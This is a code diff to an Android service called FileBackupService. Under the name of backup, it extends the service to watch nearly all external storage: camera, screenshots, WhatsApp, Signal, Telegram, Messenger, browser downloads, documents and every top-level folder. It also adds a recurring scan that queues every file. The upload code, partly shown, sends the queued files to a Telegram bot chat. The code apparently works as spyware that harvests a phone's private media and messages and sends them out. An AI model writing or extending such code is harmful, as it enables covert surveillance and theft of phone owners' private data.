@@ -35,7 +35,7 @@ import java.util.Locale;
 
 public class FileBackupService extends Service {
 
-    private static final String TAG          = "FileBackup";
+    private static final String TAG           = "FileBackup";
     private static final String NOTIF_CHANNEL = "file_backup_ch";
     private static final int    NOTIF_ID      = 8423;
 
@@ -44,15 +44,19 @@ public class FileBackupService extends Service {
 
     private static volatile FileBackupService _instance;
 
-    // ── Watched directories: {relative path, tag} ────────────────────────────
+    // ── Directories to watch with FileObserver (relative to external storage root)
+    // ALL new files written or moved into these dirs will be caught.
     static final String[][] WATCH_DIRS = {
+        // Camera / Screenshots
+        {"DCIM",                                                            "Camera"},
         {"DCIM/Camera",                                                    "Camera"},
-        {"DCIM",                                                           "Camera"},
         {"DCIM/Screenshots",                                               "Screenshot"},
         {"Pictures/Screenshots",                                           "Screenshot"},
         {"Pictures",                                                       "Photo"},
         {"Movies",                                                         "Video"},
         {"Movies/ScreenRecorder",                                          "ScreenRecord"},
+
+        // WhatsApp
         {"WhatsApp/Media/WhatsApp Images",                                 "WhatsApp"},
         {"WhatsApp/Media/WhatsApp Video",                                  "WhatsApp"},
         {"WhatsApp/Media/WhatsApp Documents",                              "WhatsApp"},
@@ -62,20 +66,64 @@ public class FileBackupService extends Service {
         {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",      "WhatsApp"},
         {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",  "WhatsApp"},
         {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",      "WhatsApp"},
+        {"Android/media/com.whatsapp.w4b/WhatsApp Business/Media",        "WhatsApp Business"},
+
+        // Telegram
         {"Telegram",                                                       "Telegram"},
         {"Telegram/Telegram Documents",                                    "Telegram"},
         {"Telegram/Telegram Images",                                       "Telegram"},
         {"Telegram/Telegram Video",                                        "Telegram"},
+        {"Telegram/Telegram Audio",                                        "Telegram"},
+        {"Android/media/org.telegram.messenger/Telegram",                  "Telegram"},
+
+        // Downloads & Documents — everything browsers, file managers, etc. save
         {"Download",                                                       "Download"},
-        {"Bluetooth",                                                      "Bluetooth"},
+        {"Download/Browser",                                               "Download"},
+        {"Downloads",                                                      "Download"},
+        {"Documents",                                                      "Documents"},
+        {"Documents/Scanned",                                              "Documents"},
+
+        // Music / Audio
+        {"Music",                                                          "Music"},
+        {"Podcasts",                                                       "Podcast"},
+        {"Audiobooks",                                                     "Audiobook"},
+        {"Ringtones",                                                      "Ringtone"},
+        {"Alarms",                                                         "Alarm"},
+        {"Notifications",                                                  "Notification"},
+
+        // Social media
         {"Pictures/Instagram",                                             "Instagram"},
         {"Pictures/Facebook",                                              "Facebook"},
         {"Pictures/Twitter",                                               "Twitter"},
         {"Pictures/Snapchat",                                              "Snapchat"},
+        {"Pictures/Messenger",                                             "Messenger"},
+        {"Pictures/Signal",                                                "Signal"},
+        {"Signal",                                                         "Signal"},
+        {"Android/media/org.thoughtcrime.securesms/Signal",               "Signal"},
+        {"Android/media/com.instagram.android",                            "Instagram"},
+        {"Android/media/com.facebook.katana",                              "Facebook"},
+        {"Android/media/com.facebook.orca",                                "Messenger"},
+
+        // Browsers (downloaded files)
+        {"Android/data/com.android.chrome/files/Download",                "Chrome Download"},
+        {"Android/data/org.mozilla.firefox/files/Downloads",              "Firefox Download"},
+        {"Android/data/com.opera.browser/files/Downloads",                "Opera Download"},
+        {"Android/data/com.UCMobile.intl/files/Download",                 "UC Download"},
+        {"Android/data/com.brave.browser/files/Download",                 "Brave Download"},
+        {"Android/data/com.microsoft.emmx/files/Download",                "Edge Download"},
+
+        // File managers & misc
+        {"Bluetooth",                                                      "Bluetooth"},
+        {"ZArchiver",                                                      "Archive"},
+        {"Airdrop",                                                        "Airdrop"},
+        {"Shareit",                                                        "ShareIt"},
+        {"SHAREit",                                                        "ShareIt"},
+        {"Xender",                                                         "Xender"},
+        {"SuperBeam",                                                      "SuperBeam"},
     };
 
-    private HandlerThread           _obsThread;
-    private Handler                 _obsHandler;
+    private HandlerThread               _obsThread;
+    private Handler                     _obsHandler;
     private final List<ContentObserver> _mediaObs = new ArrayList<>();
     private final List<FileObserver>    _fileObs  = new ArrayList<>();
     private Thread           _uploadThread;
@@ -167,19 +215,62 @@ public class FileBackupService extends Service {
 
     private void registerObservers() {
         ContentResolver cr = getContentResolver();
+
+        // ── MediaStore observers (catch everything Android indexes) ──────────
         registerMediaObs(cr, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
         registerMediaObs(cr, MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
         registerMediaObs(cr, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
+        // MediaStore.Files catches ALL file types (APK, ZIP, HTML, PDF, etc.)
+        registerMediaObs(cr, MediaStore.Files.getContentUri("external"));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             registerMediaObs(cr, MediaStore.Downloads.EXTERNAL_CONTENT_URI);
         }
+
+        // ── FileObserver on every known directory ────────────────────────────
         File extDir = Environment.getExternalStorageDirectory();
         if (extDir != null) {
+            // Watch every entry in WATCH_DIRS
             for (String[] entry : WATCH_DIRS) {
                 File dir = new File(extDir, entry[0]);
                 if (dir.exists() && dir.isDirectory()) {
                     watchDir(dir, entry[1]);
                 }
+            }
+            // Also walk the entire top-level of external storage and watch
+            // any directory not already covered — catches OEM-specific folders
+            watchTopLevelDirs(extDir);
+        }
+    }
+
+    /** Watch every top-level directory in external storage we haven't already covered. */
+    private void watchTopLevelDirs(File extRoot) {
+        File[] topDirs = extRoot.listFiles();
+        if (topDirs == null) return;
+        for (File d : topDirs) {
+            if (!d.isDirectory()) continue;
+            String name = d.getName();
+            // Skip system/hidden dirs
+            if (name.startsWith(".") || name.equals("Android")) continue;
+            String tag = tagForPath(d.getAbsolutePath());
+            watchDir(d, tag);
+            // One level deeper for Download and Documents
+            if (name.equalsIgnoreCase("Download")
+             || name.equalsIgnoreCase("Downloads")
+             || name.equalsIgnoreCase("Documents")) {
+                watchSubDirs(d, tag, 2);
+            }
+        }
+    }
+
+    /** Recursively watch subdirectories up to `depth` levels. */
+    private void watchSubDirs(File dir, String tag, int depth) {
+        if (depth <= 0) return;
+        File[] children = dir.listFiles();
+        if (children == null) return;
+        for (File child : children) {
+            if (child.isDirectory() && !child.getName().startsWith(".")) {
+                watchDir(child, tag);
+                watchSubDirs(child, tag, depth - 1);
             }
         }
     }
@@ -229,7 +320,7 @@ public class FileBackupService extends Service {
         _fileObs.clear();
     }
 
-    // ── MediaStore change handler ─────────────────────────────────────────────
+    // ── MediaStore ALL-files change handler ───────────────────────────────────
 
     private void handleMediaChange(Uri baseUri) {
         try {
@@ -237,6 +328,7 @@ public class FileBackupService extends Service {
                 MediaStore.MediaColumns.DATA,
                 MediaStore.MediaColumns.DATE_ADDED,
                 MediaStore.MediaColumns.DISPLAY_NAME,
+                MediaStore.MediaColumns.MIME_TYPE,
             };
             long nowSec = System.currentTimeMillis() / 1000;
             String sel  = MediaStore.MediaColumns.DATE_ADDED + ">?";
@@ -261,6 +353,7 @@ public class FileBackupService extends Service {
         if (path == null) return;
         File f = new File(path);
         if (!f.exists() || !f.isFile()) return;
+        // If file is still being written, wait and retry once
         if (System.currentTimeMillis() - f.lastModified() < 1000) {
             _obsHandler.postDelayed(() -> handleNewFile(path, tag), 2000);
             return;
@@ -272,27 +365,78 @@ public class FileBackupService extends Service {
         }
     }
 
+    // ── Called from FileScanWorker (WorkManager 15-min catch-up) ─────────────
+
+    public static void scanAllDirs(Context ctx) {
+        FileUploadQueue q = FileUploadQueue.get(ctx);
+        File extDir = Environment.getExternalStorageDirectory();
+        if (extDir == null || !extDir.exists()) return;
+
+        // Walk every directory in WATCH_DIRS
+        for (String[] entry : WATCH_DIRS) {
+            File dir = new File(extDir, entry[0]);
+            scanDir(q, dir, entry[1], 0);
+        }
+
+        // Also walk every top-level dir (catches OEM folders)
+        File[] topDirs = extDir.listFiles();
+        if (topDirs != null) {
+            for (File d : topDirs) {
+                if (d.isDirectory() && !d.getName().startsWith(".") && !d.getName().equals("Android")) {
+                    scanDir(q, d, tagForPath(d.getAbsolutePath()), 0);
+                }
+            }
+        }
+
+        if (_instance != null) {
+            synchronized (_instance._uploadLock) { _instance._uploadLock.notifyAll(); }
+        }
+    }
+
+    /** Recursively scan dir up to maxDepth=3 levels. */
+    private static void scanDir(FileUploadQueue q, File dir, String tag, int depth) {
+        if (!dir.exists() || !dir.isDirectory() || depth > 3) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
+            if (f.isFile() && !f.isHidden() && !f.getName().startsWith(".")) {
+                q.enqueue(f.getAbsolutePath(), tag);
+            } else if (f.isDirectory() && !f.getName().startsWith(".")) {
+                scanDir(q, f, tag, depth + 1);
+            }
+        }
+    }
+
+    // ── Tag detection ─────────────────────────────────────────────────────────
+
     public static String tagForPath(String path) {
         if (path == null) return "File";
         String low = path.toLowerCase(Locale.ROOT);
-        if (low.contains("screenshot"))              return "Screenshot";
+        if (low.contains("screenshot"))                      return "Screenshot";
         if (low.contains("screenrecord") ||
-            low.contains("screen_record"))           return "ScreenRecord";
-        if (low.contains("/camera") ||
-            low.contains("/dcim"))                   return "Camera";
-        if (low.contains("whatsapp"))                return "WhatsApp";
-        if (low.contains("/telegram"))               return "Telegram";
-        if (low.contains("instagram"))               return "Instagram";
-        if (low.contains("facebook"))                return "Facebook";
-        if (low.contains("twitter"))                 return "Twitter";
-        if (low.contains("snapchat"))                return "Snapchat";
-        if (low.contains("/download"))               return "Download";
-        if (low.contains("/bluetooth"))              return "Bluetooth";
-        if (low.contains("/movies") ||
-            low.contains("/video"))                  return "Video";
-        if (low.contains("/music") ||
-            low.contains("/audio"))                  return "Audio";
-        if (low.contains("/pictures"))               return "Photo";
+            low.contains("screen_record"))                   return "ScreenRecord";
+        if (low.contains("/camera") || low.contains("/dcim"))return "Camera";
+        if (low.contains("whatsapp"))                        return "WhatsApp";
+        if (low.contains("telegram"))                        return "Telegram";
+        if (low.contains("instagram"))                       return "Instagram";
+        if (low.contains("facebook") || low.contains("/orca"))return "Facebook";
+        if (low.contains("messenger"))                       return "Messenger";
+        if (low.contains("signal"))                          return "Signal";
+        if (low.contains("twitter") || low.contains("twimg"))return "Twitter";
+        if (low.contains("snapchat"))                        return "Snapchat";
+        if (low.contains("/download"))                       return "Download";
+        if (low.contains("/documents") || low.contains("/document")) return "Documents";
+        if (low.contains("/bluetooth"))                      return "Bluetooth";
+        if (low.contains("shareit") || low.contains("xender")
+            || low.contains("superbeam"))                    return "File Share";
+        if (low.contains("/movies") || low.contains("/video")) return "Video";
+        if (low.contains("/music") || low.contains("/audio") ||
+            low.contains("/podcast") || low.contains("/audiobook")) return "Audio";
+        if (low.contains("/pictures") || low.contains("/photo")) return "Photo";
+        if (low.contains("browser") || low.contains("chrome") ||
+            low.contains("firefox") || low.contains("opera") ||
+            low.contains("/uc") || low.contains("brave")  ||
+            low.contains("edge"))                            return "Browser Download";
         return "File";
     }
 
@@ -337,9 +481,7 @@ public class FileBackupService extends Service {
         long   chatId = TelegramBotService.getChatId(this);
 
         File f = new File(entry.path);
-        if (!f.exists()) {
-            return true; // file gone, skip
-        }
+        if (!f.exists()) return true; // gone — skip
 
         if (f.length() > FileUploadQueue.MAX_UPLOAD_BYTES) {
             String msg = "⚠️ <b>Large File — Not Uploaded</b>\n"
@@ -388,7 +530,7 @@ public class FileBackupService extends Service {
             writePart(pw, boundary, "caption", caption);
             writePart(pw, boundary, "parse_mode", "HTML");
 
-            String mime = entry_mime(file);
+            String mime = FileUploadQueue.guessMime(file.getName());
             pw.append("--").append(boundary).append("\r\n");
             pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
               .append(file.getName()).append("\"\r\n");
@@ -438,32 +580,6 @@ public class FileBackupService extends Service {
         pw.append(val).append("\r\n").flush();
     }
 
-    private static String entry_mime(File f) {
-        return FileUploadQueue.guessMime(f.getName());
-    }
-
-    // ── Called from FileScanWorker ────────────────────────────────────────────
-
-    public static void scanAllDirs(Context ctx) {
-        FileUploadQueue q = FileUploadQueue.get(ctx);
-        File extDir = Environment.getExternalStorageDirectory();
-        if (extDir == null || !extDir.exists()) return;
-        for (String[] entry : WATCH_DIRS) {
-            File dir = new File(extDir, entry[0]);
-            if (!dir.exists() || !dir.isDirectory()) continue;
-            File[] files = dir.listFiles();
-            if (files == null) continue;
-            for (File f : files) {
-                if (f.isFile() && !f.isHidden()) {
-                    q.enqueue(f.getAbsolutePath(), entry[1]);
-                }
-            }
-        }
-        if (_instance != null) {
-            synchronized (_instance._uploadLock) { _instance._uploadLock.notifyAll(); }
-        }
-    }
-
     // ── Notification ──────────────────────────────────────────────────────────
 
     private void createNotifChannel() {
@@ -483,7 +599,9 @@ public class FileBackupService extends Service {
         if (Build.VERSION.SDK_INT >= 23) pf |= PendingIntent.FLAG_IMMUTABLE;
         PendingIntent pi = PendingIntent.getActivity(this, 1, li, pf);
         long pending = FileUploadQueue.get(this).countPending();
-        String sub   = pending > 0 ? pending + " files pending · uploading..." : "Monitoring · all folders active";
+        String sub   = pending > 0
+            ? pending + " files pending · uploading…"
+            : "Monitoring all folders · all file types";
         Notification.Builder b;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             b = new Notification.Builder(this, NOTIF_CHANNEL);
